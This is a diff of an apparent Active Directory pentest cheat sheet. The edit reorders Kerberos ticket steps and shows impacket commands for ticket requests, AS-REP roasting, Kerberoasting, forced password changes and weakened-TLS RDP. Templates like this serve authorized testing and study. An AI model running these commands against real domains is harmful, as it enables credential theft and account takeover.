@@ -293,18 +293,17 @@ MYKRB5="custom_krb5.conf";export KRB5_CONFIG="$PWD/$MYKRB5"; nano ./"$MYKRB5"
     .$DOM = $KRB5DOM
 
 impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET
+export KRB5CCNAME="$PWD/$USERNAME@SPN@$KRB5DOM.ccache"
+kinit -c "$PWD/$USERNAME@SPN@$KRB5DOM.ccache" '$USERNAME@$KRB5DOM'
+klist
+
 impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $DC
-impacket-GetADUsers -dc-host $DC -k $DOM/
+impacket-GetADUsers $DOM/ -dc-host $DC -k -no-pass
 impacket-GetNPUsers -usersfile usernames $DOM/ -dc-ip "$TARGET"
 impacket-GetUserSPNs -request-user '$USERNAME' -dc-ip "$TARGET" $DOM/'$USERNAME':'$PASSWORD'
 impacket-GetUserSPNs -no-preauth '$USERNAME' -usersfile usernames -dc-host "$TARGET" $DOM/
 impacket-GetUserSPNs -request -dc-ip "$TARGET" $DOM/'$USERNAME':'$PASSWORD'
 impacket-changepasswd -dc-ip $TARGET $DC/'$USERNAME':'$PASSWORD'@$TARGET -newpass 'Password12345!'
-
-
-export KRB5CCNAME="$PWD/$USERNAME@SPN@$KRB5DOM.ccache"
-kinit -c "$PWD/$USERNAME@SPN@$KRB5DOM.ccache" '$USERNAME@$KRB5DOM'
-klist
 
 [*] RDP
 xfreerdp /v:'$TARGET' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard
